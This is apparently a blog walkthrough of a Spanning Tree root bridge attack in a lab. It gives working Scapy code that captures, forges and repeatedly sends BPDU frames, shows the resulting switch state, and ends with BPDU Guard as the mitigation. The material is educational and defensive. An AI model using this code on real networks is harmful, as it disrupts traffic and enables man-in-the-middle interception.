---
title: STP Root Bridge Attack
description: Walkthrough of STP Root Bridge Attack using physical devices.
date: 2026-01-15 15:00:50 +0800
categories: [Security, L2 Attacks, STP]
tags: [Security]
pin: false
math: false
mermaid: true

---

![Desktop View](/images/STP/git.png){: width="972" height="589" }


## What is an STP Root Bridge Attack?

In a **Root Bridge Attack**, an attacker broadcasts forged BPDU frames that claim to have a Bridge ID equal to or lower than the current root bridge. This manipulation makes the network believe that the attacker's device should become the root switch. The consequences include:

- **Network traffic disruption** through port blocking
- **Potential man-in-the-middle attacks**

---

## Network Topology

![STP Root Attack - Network Topology](/images/STP/STP_TOP.png)
*Figure 1: STP Root Attack Network Topology*



```text
SwitchA#show spanning-tree vlan 10
VLAN0010
  Spanning tree enabled protocol ieee
  Root ID    Priority    32778
             Address     000d.edfd.15c0
             This bridge is the root
             Hello Time 2 sec  Max Age 20 sec  Forward Delay 15 sec

  Bridge ID  Priority    32778 (priority 32768 sys-id-ext 10)
             Address     000d.edfd.15c0
             Hello Time 2 sec  Max Age 20 sec  Forward Delay 15 sec
             Aging Time 300

Interface        Role Sts Cost  Prio.Nbr Type
---------------- ---- --- ----  -------- ----
Fa0/1            Desg FWD 19    128.1    P2p
Fa0/24           Desg FWD 19    128.24   P2p
```
*Figure 2: STP Information in VLAN 10*

---

## Attack Execution

### Step 1: Capturing BPDU Frames
The attacker uses Scapy's `sniff()` method to capture legitimate BPDU frames:

```python
pkt = sniff(filter="ether dst 01:80:c2:00:00:00", iface="eth0", count=1)
```
- **filter**: Captures packets with STP multicast destination MAC
- **iface**: Monitors eth0
- **count**: Captures one packet for analysis


```python
>>> pkt = sniff(filter="ether dst 01:80:c2:00:00:00", iface="eth0", count=1)
>>> pkt[0].show()
###[ 802.3 ]###
  dst = 01:80:c2:00:00:00
  src = 00:0e:38:47:56:17
  len = 38

###[ LLC ]###
  dsap = 0x42
  ssap = 0x42
  ctrl = 3

###[ Spanning Tree Protocol ]###
  proto     = 0
  version   = 0
  bpdutype  = 0
  bpduflags = 0
  rootid    = 32778
  rootmac   = 00:0d:ed:fd:15:c0
  pathcost  = 19
  bridgeid  = 32778
  bridgemac = 00:0e:38:47:56:00
  portid    = 32791
``` 

### Step 2: Frame Modification
Key BPDU fields are manipulated:

```python
pkt[0].pathcost = 0
pkt[0].src = pkt[0].rootmac
pkt[0].bridgemac = pkt[0].rootmac
pkt[0].portid = 0
```

**Field Explanations:**
- **`rootmac`**: MAC address of the current root bridge
- **`bridgemac`**: MAC address of the sending switch
- **`portid`**: Identifies the root port (lower values = higher priority)
- **`pathcost`**: Cost to reach the root bridge (0 = directly connected)

### Step 3: Sending Forged Frames

![Sending Forged BPDU Frames to Switch](/images/STP/sending.drawio.png)
*Figure 3: Sending Forged BPDU Frames*
 
```python
for i in range(1, 1000):
    time.sleep(1)
    sendp(pkt[0], iface="eth0", verbose=1)
```
- Continuous transmission of forged BPDUs
- 1-second intervals between frames
- Persistent attack to maintain root status

---

## Attack Impact

### Network Manipulation

**What happens:**
1. Switch B receives the forged BPDUs
2. Believes the attacker's PC is the legitimate root bridge
3. Blocks the port connected to the real root switch (Switch A)
4. Elects the attacker's port as root port

```text
SwitchB# show spanning-tree vlan 10

VLAN0010
  Spanning tree enabled protocol ieee
  Root ID    Priority    32778
             Address     000d.edfd.15c0
             Cost        19
             Port        23 (FastEthernet0/23)
             Hello Time 2 sec  Max Age 20 sec  Forward Delay 15 sec

  Bridge ID  Priority    32778 (priority 32768 sys-id-ext 10)
             Address     000e.3847.5600
             Hello Time 2 sec  Max Age 20 sec  Forward Delay 15 sec
             Aging Time 300

Interface        Role Sts Cost  Prio.Nbr Type
---------------- ---- --- ----  -------- ----
Fa0/1            Altn BLK 19    128.1    P2p
Fa0/23           Root FWD 19    128.23   P2p
```
*Figure 4: Switch B Accepting Forged BPDUs*

### Resulting Topology

![Network Topology from Switch B's Perspective](/images/STP/final.drawio.png)
*Figure 5: Switch B's View of the Network*

**Critical Consequences:**
- Communication between Switch A and Switch B is completely blocked
- Devices on Switch B cannot reach devices on Switch A
- All inter-switch traffic in the VLAN is disrupted
- The attacker controls the network path

---

## Attack Mitigation

### Solution: BPDU Guard
Enable BPDU Guard on access ports to prevent unauthorized BPDU reception:

```
SwitchB(config)#int fa0/23
SwitchB(config-if)#spanning-tree bpduguard enable
```


### BPDU Guard Behavior
When activated:


```text
SwitchB# show interfaces status

Port      Name               Status       Vlan       Duplex  Speed Type
Fa0/21                        notconnect  1          auto    auto  10/100BaseTX
Fa0/22                        notconnect  1          auto    auto  10/100BaseTX
Fa0/23                        err-disabled 10        auto    auto  10/100BaseTX
Fa0/24                        notconnect  1          auto    auto  10/100BaseTX
```

1. Ports receiving BPDUs transition to **err-disabled** state
2. Complete traffic blockage on the affected port
3. Requires manual intervention or auto-recovery configuration
4. Logs the security violation for monitoring

